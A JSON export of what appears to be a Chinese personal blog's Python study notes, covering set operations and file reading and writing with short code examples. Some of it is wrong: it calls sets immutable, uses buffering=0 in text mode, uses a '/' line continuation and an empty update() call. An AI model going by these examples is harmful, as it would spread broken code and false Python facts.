href=\"#intersection-update-用交集更新\" class=\"headerlink\" title=\"intersection_update() #用交集更新\"></a>intersection_update() #用交集更新</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.intersection_update(set2)    <span class=\"comment\">#set1变为&#123;1，3，5&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"isdisjoint-无交集True，有交集False\"><a href=\"#isdisjoint-无交集True，有交集False\" class=\"headerlink\" title=\"isdisjoint() #无交集True，有交集False\"></a>isdisjoint() #无交集True，有交集False</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.isdisjoint(set2)    <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"并集\"><a href=\"#并集\" class=\"headerlink\" title=\"并集 |\"></a><strong>并集 |</strong></h4><h5 id=\"union\"><a href=\"#union\" class=\"headerlink\" title=\"union()\"></a>union()</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.union(set2)   <span class=\"comment\">#&#123;1,2,3,4,5,7&#125;</span></span><br><span class=\"line\">set1 | set2        <span class=\"comment\">#&#123;1,2,3,4,5,7&#125;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>集合是不可变的，操作不会影响set1，set2</li>\n</ul>\n<h4 id=\"差集\"><a href=\"#差集\" class=\"headerlink\" title=\"差集 -\"></a><strong>差集 -</strong></h4><h5 id=\"difference\"><a href=\"#difference\" class=\"headerlink\" title=\"difference()\"></a>difference()</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.difference(set2)   <span class=\"comment\">#set1有，set2无，&#123;2,4&#125;</span></span><br><span class=\"line\">set1 - set2             <span class=\"comment\">#set1有，set2无，&#123;2,4&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">set2.difference(set1)   <span class=\"comment\">#set2有，set1无，&#123;7&#125;</span></span><br><span class=\"line\">set2 - set1             <span class=\"comment\">#set2有，set1无，&#123;7&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"difference-update-取差集并更新\"><a href=\"#difference-update-取差集并更新\" class=\"headerlink\" title=\"difference_update() #取差集并更新\"></a>difference_update() #取差集并更新</h5><h4 id=\"对称差集\"><a href=\"#对称差集\" class=\"headerlink\" title=\"对称差集 ^\"></a><strong>对称差集 ^</strong></h4><h5 id=\"symmetric-difference-不包含交集后的并集\"><a href=\"#symmetric-difference-不包含交集后的并集\" class=\"headerlink\" title=\"symmetric_difference() #不包含交集后的并集\"></a>symmetric_difference() #不包含交集后的并集</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>,<span class=\"number\">7</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.symmetric_difference(set2)  <span class=\"comment\">#&#123;2,4,7&#125;</span></span><br><span class=\"line\">set1 ^ set2                      <span class=\"comment\">#&#123;2,4,7&#125;</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"symmetric-difference-update\"><a href=\"#symmetric-difference-update\" class=\"headerlink\" title=\"symmetric_difference_update()\"></a>symmetric_difference_update()</h5><h4 id=\"父集、子集\"><a href=\"#父集、子集\" class=\"headerlink\" title=\"父集、子集\"></a><strong>父集、子集</strong></h4><h5 id=\"issuperset-、issubset\"><a href=\"#issuperset-、issubset\" class=\"headerlink\" title=\"issuperset()、issubset()\"></a>issuperset()、issubset()</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">4</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\">set2 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.issuperset(set2)   <span class=\"comment\">#True</span></span><br><span class=\"line\">set2.issubset(set1)     <span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"增相关\"><a href=\"#增相关\" class=\"headerlink\" title=\"增相关\"></a><strong>增相关</strong></h4><h5 id=\"add-增加一个\"><a href=\"#add-增加一个\" class=\"headerlink\" title=\"add() #增加一个\"></a>add() #增加一个</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1 = &#123;<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">5</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.add(<span class=\"number\">7</span>)</span><br></pre></td></tr></table></figure>\n<h5 id=\"updata-合并\"><a href=\"#updata-合并\" class=\"headerlink\" title=\"updata() #合并\"></a>updata() #合并</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1=&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>&#125;</span><br><span class=\"line\">set2=&#123;<span class=\"number\">3</span>,<span class=\"number\">4</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.update()</span><br></pre></td></tr></table></figure>\n<ul>\n<li>原处改变</li>\n</ul>\n<h4 id=\"删相关\"><a href=\"#删相关\" class=\"headerlink\" title=\"删相关\"></a><strong>删相关</strong></h4><h5 id=\"remove-删除一个元素\"><a href=\"#remove-删除一个元素\" class=\"headerlink\" title=\"remove() #删除一个元素\"></a>remove() #删除一个元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1=&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.remove(<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<h5 id=\"discard-删除一个元素\"><a href=\"#discard-删除一个元素\" class=\"headerlink\" title=\"discard() #删除一个元素\"></a>discard() #删除一个元素</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set1=&#123;<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">set1.discard(<span class=\"number\">2</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>remove与discard区别在于，remove删除一个不存在元素会报错，而discard不会。</li>\n</ul>\n<h5 id=\"pop-随机删除一个元素并返回该元素\"><a href=\"#pop-随机删除一个元素并返回该元素\" class=\"headerlink\" title=\"pop() #随机删除一个元素并返回该元素\"></a>pop() #随机删除一个元素并返回该元素</h5>"},{"title":"Python基础学习系列Chapter 6：文件","date":"2019-03-19T08:27:20.000Z","_content":"\n### 0x00 文件概述\n\n- 文件读写的内容都是字符串，而不是对象。\n\n### 0x01 文件操作\n\n#### 打开文件\n\n- open函数会创建并返回一个文件对象，作为到计算机一个文件的连接。\n- 调用返回的文件对象的方法，可以操作外部文件。\n\n```python\nf=open('test.txt','w',0,encoding='utf-8')\n```\n\n<!-- more -->\n\n> - 第一个参数：文件名。不用绝对路径默认为当前运行脚本所在的目录。\n> - 第二个参数：处理模式。默认是'r'\n>   - `r` ----> 只读\n>   - `w` ----> 只写。会先创建一个文件，如果已经存在则覆盖，因此原来的文件的内容会被清空。\n>   - `a` ----> 追加。已经存在文件则在之后追加内容。\n>   - `x` ----> 新建文件（写模式），若文件已存在，会报错，文件不存在才能新建成功。\n>   - `r+` ---> 读写。写是清空写，而不是追加。\n>   - `w+` ---> 写读。会先新建/清空文件，因此并不能读到之前文件的内容，只能读到后面写入的。\n>   - `a+` ---> 追加读。所有写的内容只能追加在文件最后。\n>   - 文件操作模式后可以加`b`，表示以二进制方式操作文件。\n> - 前面两个参数必须是字符串类型。\n> - 第三个参数：控制输出缓存。0表示无缓存，即写入的内容直接输出给硬盘等外部；其他数字表示缓存区满后再输出到外部文件。\n> - 第四个参数：可以设置文件的编码。\n\n#### 文件位置\n\n- 文件对象会有一个文件位置，可以想象为指针/光标，指示着文件当前所处的状态，刚创建的文件对象，偏移量默认为0。\n- 偏移量的单位为字节，一个汉字两个字节。\n- tell()：查看文件当前位置（偏移量）。\n- seek()：改变文件位置到指定偏移量并返回偏移量。\n\n```python\nf.seek(2)   #改变文件的光标到第二个字节处\n```\n\n#### 读文件\n\n- 读操作永远从文件位置开始。\n- read()、readline、readlines()都是先将整个文件读到内存当中，若文件很大时，占用大量内存且速度慢。\n- 而从文件当中获取内容的最好方法是根本不读取，使用for循坏文件对象。for循环会每次只读取一行到内存，且内存每次只存在一行。\n\n```python\nfor line in f:\n    print(line)\n```\n\n##### read() #将文件内容读为一个字符串\n\n```python\nf.read()    #读取文件光标后的所有内容\nf.read(2)   #读取文件位置后的2个字符\n```\n\n- 读取的开始位置是当前文件的位置。\n- 读取的内容会作为单一字符串。\n- 读取后，文件的位置（光标）也会相应移动。\n- 单位是字符个数，而不是字节。\n\n##### readline() #读取一行为一个字符串\n\n```python\nf.readline()    #读取光标位置到行末\nf.readline(3)   #等同于f.read(3)\n```\n\n- 读取的开始位置是当前文件的位置。\n- 读取的结束是该行的结束，即出现换行符\n- 读取后，文件的位置（光标）也会相应移动\n\n##### readlines() #读取文件的每一行到一个字符串列表\n\n```python\nf.readlines()    #读取光标位置到行末为一个字符串并作为列表的一个元素\nf.readlines(3)   #读取一行到列表中\n```\n\n#### 写文件\n\n- w操作使用seek()到指定位置插入时会将原位置的内容覆盖。\n- a操作使用seek()没有用，都只会追加在最后。\n- 特别注意：写入时，光标也在不断后移。\n\n##### write() #写入字符串\n\n```python\nf.write('abc')                             #写入字节字符串并返回写入的字符数\nf.write(bytes('abc',encoding='utf-8'))     #写入二进制字符串\n```\n\n- 当操作模式加了b时，写入只能写入二进制内容。\n\n##### writelines() #将字符串列表内容写入文件\n\n```python\nlist=['this','is','aString']\n\nf.writelines(list)\n```\n\n- 列表储存的只能是字符串对象\n\n#### 修改文件\n\n- 所有写操作都不能做到，在文件的内容之间插入内容。修改文件的两个方法：一是全部读到内存修改；二是新建一个文件。\n- 读到内存修改：如VIM等编辑器就是这种方式，整个文件读到内存，在内存修改后再写回文件中。文件大时肯定效率低。\n- 新建文件方式修改文件：\n\n```python\n#将文件中存在'b'的这行改为'B'\nwith open('old.txt') as old,/\n    open('new.txt','w') as new:\n    for line in old:\n        if line=='b\\n':\n            line='B\\n'\n        new.write(line)\n        \n```\n\n#### 关闭文件\n\n- 当文件对象不再被引用时也会自动关闭，即f引用其他对象。\n\n##### f.close()\n\n##### f.flush() #将内存输出缓冲区内容刷入硬盘，但不关闭文件\n\n- 写入文件的内容可能不会立即写入硬盘当中，而是存在内存的输出缓存区中。\n- flush()和close()都能刷新缓冲区","source":"_posts/05python基础学习系列之文件.md","raw":"---\ntitle: Python基础学习系列Chapter 6：文件\ndate: 2019-03-19 16:27:20\ntags:\n\t- Python基础\n\t- Language\ncategories: 语言\n---\n\n### 0x00 文件概述\n\n- 文件读写的内容都是字符串，而不是对象。\n\n### 0x01 文件操作\n\n#### 打开文件\n\n- open函数会创建并返回一个文件对象，作为到计算机一个文件的连接。\n- 调用返回的文件对象的方法，可以操作外部文件。\n\n```python\nf=open('test.txt','w',0,encoding='utf-8')\n```\n\n<!-- more -->\n\n> - 第一个参数：文件名。不用绝对路径默认为当前运行脚本所在的目录。\n> - 第二个参数：处理模式。默认是'r'\n>   - `r` ----> 只读\n>   - `w` ----> 只写。会先创建一个文件，如果已经存在则覆盖，因此原来的文件的内容会被清空。\n>   - `a` ----> 追加。已经存在文件则在之后追加内容。\n>   - `x` ----> 新建文件（写模式），若文件已存在，会报错，文件不存在才能新建成功。\n>   - `r+` ---> 读写。写是清空写，而不是追加。\n>   - `w+` ---> 写读。会先新建/清空文件，因此并不能读到之前文件的内容，只能读到后面写入的。\n>   - `a+` ---> 追加读。所有写的内容只能追加在文件最后。\n>   - 文件操作模式后可以加`b`，表示以二进制方式操作文件。\n> - 前面两个参数必须是字符串类型。\n> - 第三个参数：控制输出缓存。0表示无缓存，即写入的内容直接输出给硬盘等外部；其他数字表示缓存区满后再输出到外部文件。\n> - 第四个参数：可以设置文件的编码。\n\n#### 文件位置\n\n- 文件对象会有一个文件位置，可以想象为指针/光标，指示着文件当前所处的状态，刚创建的文件对象，偏移量默认为0。\n- 偏移量的单位为字节，一个汉字两个字节。\n- tell()：查看文件当前位置（偏移量）。\n- seek()：改变文件位置到指定偏移量并返回偏移量。\n\n```python\nf.seek(2)   #改变文件的光标到第二个字节处\n```\n\n#### 读文件\n\n- 读操作永远从文件位置开始。\n- read()、readline、readlines()都是先将整个文件读到内存当中，若文件很大时，占用大量内存且速度慢。\n- 而从文件当中获取内容的最好方法是根本不读取，使用for循坏文件对象。for循环会每次只读取一行到内存，且内存每次只存在一行。\n\n```python\nfor line in f:\n    print(line)\n```\n\n##### read() #将文件内容读为一个字符串\n\n```python\nf.read()    #读取文件光标后的所有内容\nf.read(2)   #读取文件位置后的2个字符\n```\n\n- 读取的开始位置是当前文件的位置。\n- 读取的内容会作为单一字符串。\n- 读取后，文件的位置（光标）也会相应移动。\n- 单位是字符个数，而不是字节。\n\n##### readline() #读取一行为一个字符串\n\n```python\nf.readline()    #读取光标位置到行末\nf.readline(3)   #等同于f.read(3)\n```\n\n- 读取的开始位置是当前文件的位置。\n- 读取的结束是该行的结束，即出现换行符\n- 读取后，文件的位置（光标）也会相应移动\n\n##### readlines() #读取文件的每一行到一个字符串列表\n\n```python\nf.readlines()    #读取光标位置到行末为一个字符串并作为列表的一个元素\nf.readlines(3)   #读取一行到列表中\n```\n\n#### 写文件\n\n- w操作使用seek()到指定位置插入时会将原位置的内容覆盖。\n- a操作使用seek()没有用，都只会追加在最后。\n- 特别注意：写入时，光标也在不断后移。\n\n##### write() #写入字符串\n\n```python\nf.write('abc')                             #写入字节字符串并返回写入的字符数\nf.write(bytes('abc',encoding='utf-8'))     #写入二进制字符串\n```\n\n- 当操作模式加了b时，写入只能写入二进制内容。\n\n##### writelines() #将字符串列表内容写入文件\n\n```python\nlist=['this','is','aString']\n\nf.writelines(list)\n```\n\n- 列表储存的只能是字符串对象\n\n#### 修改文件\n\n- 所有写操作都不能做到，在文件的内容之间插入内容。修改文件的两个方法：一是全部读到内存修改；二是新建一个文件。\n- 读到内存修改：如VIM等编辑器就是这种方式，整个文件读到内存，在内存修改后再写回文件中。文件大时肯定效率低。\n- 新建文件方式修改文件：\n\n```python\n#将文件中存在'b'的这行改为'B'\nwith open('old.txt') as old,/\n    open('new.txt','w') as new:\n    for line in old:\n        if line=='b\\n':\n            line='B\\n'\n        new.write(line)\n        \n```\n\n#### 关闭文件\n\n- 当文件对象不再被引用时也会自动关闭，即f引用其他对象。\n\n##### f.close()\n\n##### f.flush() #将内存输出缓冲区内容刷入硬盘，但不关闭文件\n\n- 写入文件的内容可能不会立即写入硬盘当中，而是存在内存的输出缓存区中。\n- flush()和close()都能刷新缓冲区","slug":"05python基础学习系列之文件","published":1,"updated":"2019-03-22T03:54:10.727Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjuam83k300137or0bz6wf7d5","content":"<h3 id=\"0x00-文件概述\"><a href=\"#0x00-文件概述\" class=\"headerlink\" title=\"0x00 文件概述\"></a>0x00 文件概述</h3><ul>\n<li>文件读写的内容都是字符串，而不是对象。</li>\n</ul>\n<h3 id=\"0x01-文件操作\"><a href=\"#0x01-文件操作\" class=\"headerlink\" title=\"0x01 文件操作\"></a>0x01 文件操作</h3><h4 id=\"打开文件\"><a href=\"#打开文件\" class=\"headerlink\" title=\"打开文件\"></a>打开文件</h4><ul>\n<li>open函数会创建并返回一个文件对象，作为到计算机一个文件的连接。</li>\n<li>调用返回的文件对象的方法，可以操作外部文件。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f=open(<span class=\"string\">'test.txt'</span>,<span class=\"string\">'w'</span>,<span class=\"number\">0</span>,encoding=<span class=\"string\">'utf-8'</span>)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n<blockquote>\n<ul>\n<li>第一个参数：文件名。不用绝对路径默认为当前运行脚本所在的目录。</li>\n<li>第二个参数：处理模式。默认是’r’<ul>\n<li><code>r</code> —-&gt; 只读</li>\n<li><code>w</code> —-&gt; 只写。会先创建一个文件，如果已经存在则覆盖，因此原来的文件的内容会被清空。</li>\n<li><code>a</code> —-&gt; 追加。已经存在文件则在之后追加内容。</li>\n<li><code>x</code> —-&gt; 新建文件（写模式），若文件已存在，会报错，文件不存在才能新建成功。</li>\n<li><code>r+</code> —&gt; 读写。写是清空写，而不是追加。</li>\n<li><code>w+</code> —&gt; 写读。会先新建/清空文件，因此并不能读到之前文件的内容，只能读到后面写入的。</li>\n<li><code>a+</code> —&gt; 追加读。所有写的内容只能追加在文件最后。</li>\n<li>文件操作模式后可以加<code>b</code>，表示以二进制方式操作文件。</li>\n</ul>\n</li>\n<li>前面两个参数必须是字符串类型。</li>\n<li>第三个参数：控制输出缓存。0表示无缓存，即写入的内容直接输出给硬盘等外部；其他数字表示缓存区满后再输出到外部文件。</li>\n<li>第四个参数：可以设置文件的编码。</li>\n</ul>\n</blockquote>\n<h4 id=\"文件位置\"><a href=\"#文件位置\" class=\"headerlink\" title=\"文件位置\"></a>文件位置</h4><ul>\n<li>文件对象会有一个文件位置，可以想象为指针/光标，指示着文件当前所处的状态，刚创建的文件对象，偏移量默认为0。</li>\n<li>偏移量的单位为字节，一个汉字两个字节。</li>\n<li>tell()：查看文件当前位置（偏移量）。</li>\n<li>seek()：改变文件位置到指定偏移量并返回偏移量。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.seek(<span class=\"number\">2</span>)   <span class=\"comment\">#改变文件的光标到第二个字节处</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"读文件\"><a href=\"#读文件\" class=\"headerlink\" title=\"读文件\"></a>读文件</h4><ul>\n<li>读操作永远从文件位置开始。</li>\n<li>read()、readline、readlines()都是先将整个文件读到内存当中，若文件很大时，占用大量内存且速度慢。</li>\n<li>而从文件当中获取内容的最好方法是根本不读取，使用for循坏文件对象。for循环会每次只读取一行到内存，且内存每次只存在一行。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> f:</span><br><span class=\"line\">    print(line)</span><br></pre></td></tr></table></figure>\n<h5 id=\"read-将文件内容读为一个字符串\"><a href=\"#read-将文件内容读为一个字符串\" class=\"headerlink\" title=\"read() #将文件内容读为一个字符串\"></a>read() #将文件内容读为一个字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.read()    <span class=\"comment\">#读取文件光标后的所有内容</span></span><br><span class=\"line\">f.read(<span class=\"number\">2</span>)   <span class=\"comment\">#读取文件位置后的2个字符</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>读取的开始位置是当前文件的位置。</li>\n<li>读取的内容会作为单一字符串。</li>\n<li>读取后，文件的位置（光标）也会相应移动。</li>\n<li>单位是字符个数，而不是字节。</li>\n</ul>\n<h5 id=\"readline-读取一行为一个字符串\"><a href=\"#readline-读取一行为一个字符串\" class=\"headerlink\" title=\"readline() #读取一行为一个字符串\"></a>readline() #读取一行为一个字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.readline()    <span class=\"comment\">#读取光标位置到行末</span></span><br><span class=\"line\">f.readline(<span class=\"number\">3</span>)   <span class=\"comment\">#等同于f.read(3)</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>读取的开始位置是当前文件的位置。</li>\n<li>读取的结束是该行的结束，即出现换行符</li>\n<li>读取后，文件的位置（光标）也会相应移动</li>\n</ul>\n<h5 id=\"readlines-读取文件的每一行到一个字符串列表\"><a href=\"#readlines-读取文件的每一行到一个字符串列表\" class=\"headerlink\" title=\"readlines() #读取文件的每一行到一个字符串列表\"></a>readlines() #读取文件的每一行到一个字符串列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.readlines()    <span class=\"comment\">#读取光标位置到行末为一个字符串并作为列表的一个元素</span></span><br><span class=\"line\">f.readlines(<span class=\"number\">3</span>)   <span class=\"comment\">#读取一行到列表中</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"写文件\"><a href=\"#写文件\" class=\"headerlink\" title=\"写文件\"></a>写文件</h4><ul>\n<li>w操作使用seek()到指定位置插入时会将原位置的内容覆盖。</li>\n<li>a操作使用seek()没有用，都只会追加在最后。</li>\n<li>特别注意：写入时，光标也在不断后移。</li>\n</ul>\n<h5 id=\"write-写入字符串\"><a href=\"#write-写入字符串\" class=\"headerlink\" title=\"write() #写入字符串\"></a>write() #写入字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f.write(<span class=\"string\">'abc'</span>)                             <span class=\"comment\">#写入字节字符串并返回写入的字符数</span></span><br><span class=\"line\">f.write(bytes(<span class=\"string\">'abc'</span>,encoding=<span class=\"string\">'utf-8'</span>))     <span class=\"comment\">#写入二进制字符串</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>当操作模式加了b时，写入只能写入二进制内容。</li>\n</ul>\n<h5 id=\"writelines-将字符串列表内容写入文件\"><a href=\"#writelines-将字符串列表内容写入文件\" class=\"headerlink\" title=\"writelines() #将字符串列表内容写入文件\"></a>writelines() #将字符串列表内容写入文件</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">list=[<span class=\"string\">'this'</span>,<span class=\"string\">'is'</span>,<span class=\"string\">'aString'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">f.writelines(list)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>列表储存的只能是字符串对象</li>\n</ul>\n<h4 id=\"修改文件\"><a href=\"#修改文件\" class=\"headerlink\" title=\"修改文件\"></a>修改文件</h4><ul>\n<li>所有写操作都不能做到，在文件的内容之间插入内容。修改文件的两个方法：一是全部读到内存修改；二是新建一个文件。</li>\n<li>读到内存修改：如VIM等编辑器就是这种方式，整个文件读到内存，在内存修改后再写回文件中。文件大时肯定效率低。</li>\n<li>新建文件方式修改文件：</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#将文件中存在'b'的这行改为'B'</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'old.txt'</span>) <span class=\"keyword\">as</span> old,/</span><br><span class=\"line\">    open(<span class=\"string\">'new.txt'</span>,<span class=\"string\">'w'</span>) <span class=\"keyword\">as</span> new:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> old:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> line==<span class=\"string\">'b\\n'</span>:</span><br><span class=\"line\">            line=<span class=\"string\">'B\\n'</span></span><br><span class=\"line\">        new.write(line)</span><br></pre></td></tr></table></figure>\n<h4 id=\"关闭文件\"><a href=\"#关闭文件\" class=\"headerlink\" title=\"关闭文件\"></a>关闭文件</h4><ul>\n<li>当文件对象不再被引用时也会自动关闭，即f引用其他对象。</li>\n</ul>\n<h5 id=\"f-close\"><a href=\"#f-close\" class=\"headerlink\" title=\"f.close()\"></a>f.close()</h5><h5 id=\"f-flush-将内存输出缓冲区内容刷入硬盘，但不关闭文件\"><a href=\"#f-flush-将内存输出缓冲区内容刷入硬盘，但不关闭文件\" class=\"headerlink\" title=\"f.flush() #将内存输出缓冲区内容刷入硬盘，但不关闭文件\"></a>f.flush() #将内存输出缓冲区内容刷入硬盘，但不关闭文件</h5><ul>\n<li>写入文件的内容可能不会立即写入硬盘当中，而是存在内存的输出缓存区中。</li>\n<li>flush()和close()都能刷新缓冲区</li>\n</ul>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-文件概述\"><a href=\"#0x00-文件概述\" class=\"headerlink\" title=\"0x00 文件概述\"></a>0x00 文件概述</h3><ul>\n<li>文件读写的内容都是字符串，而不是对象。</li>\n</ul>\n<h3 id=\"0x01-文件操作\"><a href=\"#0x01-文件操作\" class=\"headerlink\" title=\"0x01 文件操作\"></a>0x01 文件操作</h3><h4 id=\"打开文件\"><a href=\"#打开文件\" class=\"headerlink\" title=\"打开文件\"></a>打开文件</h4><ul>\n<li>open函数会创建并返回一个文件对象，作为到计算机一个文件的连接。</li>\n<li>调用返回的文件对象的方法，可以操作外部文件。</li>\n</ul>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f=open(<span class=\"string\">'test.txt'</span>,<span class=\"string\">'w'</span>,<span class=\"number\">0</span>,encoding=<span class=\"string\">'utf-8'</span>)</span><br></pre></td></tr></table></figure>","more":"<blockquote>\n<ul>\n<li>第一个参数：文件名。不用绝对路径默认为当前运行脚本所在的目录。</li>\n<li>第二个参数：处理模式。默认是’r’<ul>\n<li><code>r</code> —-&gt; 只读</li>\n<li><code>w</code> —-&gt; 只写。会先创建一个文件，如果已经存在则覆盖，因此原来的文件的内容会被清空。</li>\n<li><code>a</code> —-&gt; 追加。已经存在文件则在之后追加内容。</li>\n<li><code>x</code> —-&gt; 新建文件（写模式），若文件已存在，会报错，文件不存在才能新建成功。</li>\n<li><code>r+</code> —&gt; 读写。写是清空写，而不是追加。</li>\n<li><code>w+</code> —&gt; 